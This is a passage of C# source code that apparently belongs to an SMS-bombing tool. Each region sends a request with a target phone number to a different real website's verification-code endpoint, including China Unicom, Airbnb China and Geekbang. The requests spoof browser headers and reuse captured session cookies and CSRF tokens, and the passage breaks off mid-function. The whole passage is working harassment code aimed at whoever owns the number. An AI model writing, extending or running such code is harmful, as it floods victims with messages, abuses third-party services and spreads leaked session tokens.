                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://www.tffwzl.com/code";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"XSRF-TOKEN=eyJpdiI6InpmcVgra2I3TVdaVFV1N3F3WWNZWlE9PSIsInZhbHVlIjoiMmowYlN2UUpMdlU0UzIzWUJ2b2tuOU50NHNOXC8rREt1TXdiTHRYWVFsTUZkblZOWDRudG9ibkN6K3d4b1l3TnRTdEhIVFNwcm1lOHlGcElzRnNsWVVnPT0iLCJtYWMiOiI3OTNjOWJlZTg3NTkxNmZmYjRmYzZhNzdiZWJkMzJhY2VkODUyZWFkZTk0MGVjYjVhMGFkODEzYzU5MGU5MGNhIn0%3D; tffwzl_session=eyJpdiI6InYzQ1Zabmo4VFVyU2dJSzdBUFcwWmc9PSIsInZhbHVlIjoiTmc3c3dNeEpFSXZURlozU3R0a0gzRmZTVkRsbExoSkxONHR5cEpiVmRpYjNLVng4VHpnSW9GbGMrY29IYjBuelwvNldiNzJwZk1WdU1GZHFNNjFVYmZBPT0iLCJtYWMiOiI3YjllYzJkZTZmNmJjY2Y3OWIyZGIxOTM2ZGEwMWY4ODNiNTY3OTllOTFkNzE2YzcyMTgxOGE3MjhmNWY3NTZlIn0%3D");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"mobile=" + mobile + "&type=login";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 陌阡租赁
        [IsAPI("陌阡租赁")]
        public string SMS_MQZL()
        {
            Request_www_bqrzzl_com(out response);
            return ResponseStr(response);
        }
        private bool Request_www_bqrzzl_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.bqrzzl.com/sms/login");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://www.bqrzzl.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.bqrzzl.com/";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"Hm_lvt_9287e3e004c5d4343e13aac7b202779c=1570868288; Hm_lpvt_9287e3e004c5d4343e13aac7b202779c=1570868288; XSRF-TOKEN=eyJpdiI6IjJldVVFRU9OS2VHTitEQ3N5TUMrTGc9PSIsInZhbHVlIjoiT1cwcXlMK0JrejhMTU53RDZcL1hmY1h2NDR4RkUyMENJMVVWV2FXMCtSN0RwSXRPVHdBQUloeDBZdkFkdmdSeTkrMWwyVjc0VFwvN2kyV2U3Yks2SnJ4UT09IiwibWFjIjoiYTE4YTc3MWE1M2ZlZmU3OTcyYzc3MDgzMTI1MjYzZGQ4M2U0ODA5NmJkOTQ2N2Q4YzZhNGQwZjY2NGM3ZWQ0ZCJ9; laravel_session=eyJpdiI6ImxJVGZKVzlrSFZ2RmdUWTFBbDBGdkE9PSIsInZhbHVlIjoiM1V4Z1Q0ZU9kT25DellVVEtwQk42OThUZE5WdkhoVlwva2N2RDh6QmZZcGViNFdFaXRMUkwzQ092ZDNwVkxyNHZrUzlQZHNPcURcL1hcL2hQYUtTQVVOWUE9PSIsIm1hYyI6ImFiMDAxZDY1ZjY4OGYyNzIzY2Y3Y2FmYjI2ZjgzNGQ2ZDQzZTQxNTRjMzhiOTNmY2EyZGRkZWQyNTYyY2IxNjAifQ%3D%3D");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"phone=" + mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 联通活动2
        [IsAPI("联通活动2")]
        public string SMS_HD2()
        {
            Request_m_client_10010_com2(out response);
            return ResponseStr(response);
        }
        private bool Request_m_client_10010_com2(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://m.client.10010.com/redpacketsplit/static/sharesendmess/sendRandomCode");

                request.KeepAlive = true;
                request.Accept = "text/plain, */*; q=0.01";
                request.Headers.Add("Origin", @"https://m.client.10010.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; Android 9; Mi Note 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044904 Mobile Safari/537.36 MMWEBID/7747 MicroMessenger/7.0.6.1500(0x2700063E) Process/tools NetType/WIFI Language/zh_CN";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "https://m.client.10010.com/redpacketsplit/view/index_red.jsp?orderId=WTh4ZzZDbQ==&from=singlemessage";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"ecs_acc=; req_mobile=; req_serial=; clientid=98|0; req_wheel=ssss; mallcity=31|310; SHOP_PROV_CITY=; WT_FPC=id=22deddba164b7e6975f1570588532057:lv=1570588532064:ss=1570588532057; MHistoryGoodsInfo=991909266772%3A%2Fuploader%2Ftemp%2F201909260947121654882672_50_50.jpg%3A%E3%80%90%E5%85%8D%E6%81%AF%E5%88%86%E6%9C%9F%E8%B4%AD%E6%9C%BA%E3%80%91%E4%B8%89%E6%98%9FGalaxyNote10%2B%2012GB%2B256GB%EF%BC%88SM-N9760%EF%BC%895G%E7%89%88IP68%E9%98%B2%E6%B0%B4%E9%AA%81%E9%BE%99855%E5%85%A8%E7%BD%91%E9%80%9A5G%E6%89%8B%E6%9C%BA%3A7499%3A0%3A%3A%3A; Hm_lvt_9208c8c641bfb0560ce7884c36938d9d=1570588533; Hm_lpvt_9208c8c641bfb0560ce7884c36938d9d=1570588533; UID=2YLLrFHA0kWltPzHVY8J0MfHX3PTfVCE; route=fc8400c61fd9789255b44ebc489bb9c3; redpacketsplit=gEXH23a4rwMF6CCwAQMOV6DyKQofPT_Di5CJhUBIOACN5nYPTwvl!-1874896759");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"mobile=" + mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 天池云

        [IsAPI("天池云")]
        public string SMS_tcy()
        {
            Request_app_ybtvyun_com(out response);
            return ResponseStr(response);
        }
        private bool Request_app_ybtvyun_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://app.ybtvyun.com/login/index/save");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"http://app.ybtvyun.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://app.ybtvyun.com/login/index/regist?sign=0ba1f6690c3d26586d162efdb63815f7&redirect_uri=http%3A%2F%2Fwww.yb983.com%2Findex%2Flogin%2Fcallback&siteid=10006&siteurl=http%3A%2F%2Fwww.yb983.com&time=1571039919";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"PHPSESSID=04745c0276f83ba7836eaedb13c39e2a");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"type=mobile&registid=" + mobile + "&password=sadgasdgasdgha&siteid=10006";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 多粉

        [IsAPI("多粉")]
        public string SMS_jym()
        {
            Request_login_duofriend_com(out response);
            return ResponseStr(response);
        }
        private bool Request_login_duofriend_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://login.duofriend.com/busReg/sendSMS1");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://login.duofriend.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://login.duofriend.com/jsp/login/repc.jsp";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"JSESSIONID=1616364FC26566E45AC84F4367A83637; code=21560889");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"phone=" + mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 小智logo

        [IsAPI("小智logo")]
        public string SMS_xzlogo()
        {
            Request_api_xzlogo_com(out response);
            return ResponseStr(response);
        }
        private bool Request_api_xzlogo_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.xzlogo.com/auth/api/sms/sendCode");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://www.xzlogo.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.ContentType = "application/json";
                request.Accept = "*/*";
                request.Headers.Add("Sec-Fetch-Site", @"same-site");
                request.Referer = "https://www.xzlogo.com/signin";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"_ga=GA1.2.748901232.1578387907; _gid=GA1.2.598049588.1578387907; _gat_UA-92602697-1=1; Hm_lvt_6059b0f00a9052df10e8a8d56e3dcdda=1578387908; Hm_lpvt_6059b0f00a9052df10e8a8d56e3dcdda=1578387908; pyxz.sid=.eJxNj1tPgzAARv9Ln5VroS2JMcThrEEMBeb0ZSlQoHHcBg6G8b_Lk-57Puck3zd42zvRgxd4B7oBDhA21m3CbWHxFFoWJDYuIMw5MSDGnOjg5l-I6YsHHN1C2MSIaEgxINSQeUUkzF-b1Th2g6OqdadMQs6yUfpeydpazUp5m8pGHap26k9Zm4v7UWafYrwrw62Glsn9W2S1-RObXiU-58auE9vjl988zn4dnNOIzP7iXpI9o1nMWKx_1OFC50CrnrlZ6e9m4rplvIkYE-4UtnTNrjcOxUkMFXAKfhzEzy_17VH6.EPXbVQ.hjlu8pllR3eaPHa6b3gCGycGn-8");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"{""mobile"":""" + mobile + @"""}";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region t01

        [IsAPI("t01")]
        public string SMS_t01()
        {
            Request_tg01_lanyife_com_cn(out response);
            return ResponseStr(response);
        }
        private bool Request_tg01_lanyife_com_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://tg01.lanyife.com.cn/index.php?r=api/stock/get-code");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"https://t01.stockhn.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Headers.Add("Sec-Fetch-Site", @"cross-site");
                request.Referer = "https://t01.stockhn.com/10703/vf6PC1/?site=vf&pn=%E6%9C%9F%E8%B4%A7%E6%B5%8B%E8%AF%95--vf6pc1-pc-1205-02&un=%E6%9C%9F%E8%B4%A7%E8%BD%AF%E4%BB%B6&pk=%E5%8D%9A%E6%98%93%E6%9C%9F%E8%B4%A7%E5%A4%A7%E5%B8%88%E4%B8%8B%E8%BD%BD&bd_vid=11749261473732794895";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"mobile=" + mobile + "&code=axh7znQ1QybP9ZCA";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 花筑旅行

        [IsAPI("花筑旅行")]
        public string SMS_hzlx()
        {
            Request_www_aihuazhu_com(out response);
            return ResponseStr(response);
        }
        private bool Request_www_aihuazhu_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.aihuazhu.com/apic/sys/sms-code.json?mobile=" + mobile + "&country=86&lang=zh-CN&_=1578388390087");

                request.KeepAlive = true;
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.aihuazhu.com/member?joinus=true";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"checkIn=2020-01-07; checkOut=2020-01-08; inland=true; regionType=2; regionId=3; destination=%E4%B8%BD%E6%B1%9F; Hm_lvt_3b143f8ee7825f4227427bec5bcfa31a=1578388390; Hm_lpvt_3b143f8ee7825f4227427bec5bcfa31a=1578388390; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216f7f4784ac122-0a53cd0a994ee7-5b123211-2073600-16f7f4784ad7d8%22%2C%22%24device_id%22%3A%2216f7f4784ac122-0a53cd0a994ee7-5b123211-2073600-16f7f4784ad7d8%22%2C%22props%22%3A%7B%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%7D");

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 新片场

        [IsAPI("新片场")]
        public string SMS_xpc()
        {
            Request_passport_xinpianchang_com(out response);
            return ResponseStr(response);
        }
        private bool Request_passport_xinpianchang_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://passport.xinpianchang.com/api/user-center/captcha/send");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://passport.xinpianchang.com");
                request.Headers.Add("X-CSRF-Token", @"86NvXHZb-N8m-LRGMEwezO8RtZs4cy4Kz-ds");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/json; charset=utf-8";
                request.Accept = "application/json,text/html;q=0.9,application/xhtml+xml;q=0.9,application/xml;q=0.8,*/*;q=0.7";
                request.Headers.Add("X-Requested-With", @"Next-Fetch");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://passport.xinpianchang.com/signup?redirect_uri=https%3A%2F%2Fwww.xinpianchang.com%2F";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"Device_ID=o4x0a7xe4ek53nth41; Authorization=2DE9D0745842BF67A5842B43F05842BAA675842BE1B5735FDF79; XPCSID=dc298c86-c989-42e3-ba15-0e0797dd04dc; XPCSID.sig=QUA8o6VQBVPh2AVysm9nWqLSvfw");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"{""regionCode"":""+86"",""phone"":""" + mobile + @""",""type"":5}";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 库家乐

        [IsAPI("库家乐")]
        public string SMS_kjl()
        {
            Request_b_kujiale_com(out response);
            return ResponseStr(response);
        }
        private bool Request_b_kujiale_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://b.kujiale.com/api/useraccount/sms/switch/sendsms");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://b.kujiale.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "*/*";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://b.kujiale.com/?utm_source=baidu_pz&utm_medium=cpt&utm_content=main&utm_term=title";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"qhdi=c3b384d9312e11eaa08d139bad703037; kjl_marketing_session_brief=""{\""source\"":\""baidu_pz\"",\""medium\"":\""cpt\"",\""content\"":\""main\"",\""keyword\"":\""title\"",\""sessionId\"":\""c3b42080-312e-11ea-933d-c98803c59263\"",\""landingPage\"":\""https%3A%2F%2Fb.kujiale.com%2Fqiye%3Futm_source%3Dbaidu_pz%26utm_medium%3Dcpt%26utm_content%3Dmain%26utm_term%3Dtitle\""}""; _ga=GA1.2.1840044003.1578388753; _gid=GA1.2.781180598.1578388753; Hm_lvt_bd8fd4c378d7721976f466053bd4a855=1578388753; Hm_lpvt_bd8fd4c378d7721976f466053bd4a855=1578388753; utmChannel=baidu_pz; _gaexp=GAX1.2.U9-thRi6SaqxODBhwIj3AQ.18350.0; _gat_gtag_UA_43019020_4=1; kjl_usercityid=258; ktrackerid=2084dfc1-05d2-464e-9973-4cf7d736c740; MEIQIA_TRACK_ID=1W3qit4PZq2cUxtUzMeeyhxrW7J; MEIQIA_VISIT_ID=1W3qin8B9cybEiqc6Lur4L5K0DP");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"tel=" + mobile + "&type=6";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 极客科技

        [IsAPI("极客科技")]
        public string SMS_jkkj()
        {
            Request_account_geekbang_org(out response);
            return ResponseStr(response);
        }
        private bool Request_account_geekbang_org(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://account.geekbang.org/account/register/code");

                request.KeepAlive = true;
                request.Accept = "application/json, text/plain, */*";
                request.Headers.Add("Origin", @"https://account.geekbang.org");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.ContentType = "application/json";
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://account.geekbang.org/signup?redirect=https%3A%2F%2Ftime.geekbang.org%2F";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"_ga=GA1.2.336200043.1578389439; _gid=GA1.2.769883513.1578389439; _gat=1; SERVERID=3431a294a18c59fc8f5805662e2bd51e|1578389444|1578389438; LF_ID=1578389445669-6994550-9199788; GCID=7f4ea87-a30fa9c-88ad773-24bab8b; GRID=7f4ea87-a30fa9c-88ad773-24bab8b");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"{""country"":86,""cellphone"":""" + mobile + @""",""captcha"":""""}";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 情报魔方

        [IsAPI("情报魔方")]
        public string SMS_qbmf()
        {
            Request_www_qingbaomofang_com(out response);
            return ResponseStr(response);
        }
        private bool Request_www_qingbaomofang_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.qingbaomofang.com/api/authority/user/sendVerifySMS?phone=" + mobile + "&type=1");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.qingbaomofang.com/sjbd";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"Hm_lvt_6f1bec0f4a1e87b97fc832e30ae5f02b=1578389546; Hm_lpvt_6f1bec0f4a1e87b97fc832e30ae5f02b=1578389546; AGL_USER_ID=2923109b-f565-48d9-a2c4-aa13a7a92acd");

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 爱彼迎

        [IsAPI("爱彼迎")]
        public string SMS_aby()
        {
            Request_www_airbnb_cn(out response);
            return ResponseStr(response);
        }
        private bool Request_www_airbnb_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.airbnb.cn/api/v2/phone_one_time_passwords?currency=CNY&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=zh");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://www.airbnb.cn");
                request.Headers.Add("X-CSRF-Token", @"V4$.airbnb.cn$nYPTF2GuZh4$ErJeiMvLMloCh1vsykxT5i0wZm8WF-dXt4xt5kFc57o=");
                request.Headers.Add("X-CSRF-Without-Token", @"1");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/json";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Set(HttpRequestHeader.CacheControl, "no-cache");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.airbnb.cn/?_set_bev_on_new_domain=1578390500_MpyWs9CQ2bEPdGl2";
